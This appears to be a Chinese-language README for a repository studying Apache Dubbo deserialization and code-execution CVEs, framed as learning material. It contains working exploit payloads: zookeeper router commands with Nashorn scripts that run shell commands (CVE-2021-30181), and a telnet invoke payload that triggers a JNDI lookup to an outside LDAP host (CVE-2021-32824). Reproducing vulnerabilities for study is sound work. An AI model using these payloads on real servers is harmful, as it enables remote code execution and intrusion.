# Apache Dubbo系列漏洞研究
## 包含漏洞
- [x] Apache Dubbo 反序列化代码执行（CVE-2020-1948）
- [x] Apache Dubbo 反序列化代码执行（CVE-2021-43297）
- [x] Apache Dubbo 反序列化代码执行（CVE-2021-30179）
- [x] Apache Dubbo Telnet handler 代码执行（CVE-2021-32824）
- [x] Apache Dubbo 反序列化代码执行（CVE-2021-25641）
- [x] Apache Dubbo Nashorn Script 代码执行（CVE-2021-30181）
- [x] Apache Dubbo 反序列化代码执行（CVE-2023-23638）
- [ ] Apache Dubbo YAML 反序列化漏洞(CVE-2021-30180)

## 说明
### 关于漏洞
1、**Apache Dubbo Nashorn Script 代码执行（CVE-2021-30181）**  
该漏洞连上zookeeper打payload就行，具体的做法是执行zookeeper命令  
```shell
create /dubbo/[provider interface]/routers/[your payload]
```
关于payload内容，首先你需要从一个consumer中获得模板，可以执行下面的命令
```shell
ls /dubbo/[provider interface]/consumers
```
结果可能有多个，选一个就行，获得模板后记得替换开头的consumer为router，category=consumers也记得替换为category=routers。使用获得的模板拼接执行命令的语句
```shell
# linux
&route=script&type=javascript&rule=s=[3];s[0]='/bin/bash';s[1]='-c';s[2]='linux command';java.lang.Runtime.getRuntime().exec(s);
# windows
&route=script&type=javascript&rule=s=[3];s[0]='cmd.exe';s[1]='/C';s[2]='windows command';java.lang.Runtime.getRuntime().exec(s);
```

2、**Apache Dubbo Telnet handler 代码执行（CVE-2021-32824）**  
telnet连上dubbo provider打payload即可
```shell
invoke [provider_interface].[method_name]({'class':'org.apache.xbean.propertyeditor.JndiConverter','asText':'ldap://{dns_log}/#FoolBoy'},'test','test'})
```
使用时注意，调用方法时参数个数要一致，比如我的例子就有三个参数

3、**Apache Dubbo YAML 反序列化漏洞(CVE-2021-30180)**  
该漏洞一样需要控制zookeeper，我并没有找到直接在zookeeper上执行命令的利用方式  
整体来讲可以利用dubbo admin添加标签路由来进行攻击，但是直接在zookeeper通过命令的方式  
嫌麻烦（因为已经搭建了老板的dubbo admin了，并不能直接编写yaml）

### 关于依赖
大部分漏洞使用Apache Dubbo 2.7.3就可以复现，  
Apache Dubbo 反序列化代码执行（CVE-2023-23638）使用的2.7.20复现的，使用时可按需切换

## 参考与引用
- [https://www.cnblogs.com/suyu7/p/14928710.html](https://www.cnblogs.com/suyu7/p/14928710.html)
- [https://xz.aliyun.com/t/12333#toc-1](https://xz.aliyun.com/t/12333#toc-1)
- [https://www.cnblogs.com/nice0e3/p/15692979.html#cve-2020-11995](https://www.cnblogs.com/nice0e3/p/15692979.html#cve-2020-11995)

## 鸣谢
感谢各位前辈大佬的分析，让我可以系统地学习Apache Dubbo系列漏洞

## 其他
若真有后来者使用我的仓库进行学习，建议认证打断点调试弄清楚每一个漏洞的原理，  
而不是当一个脚本小子
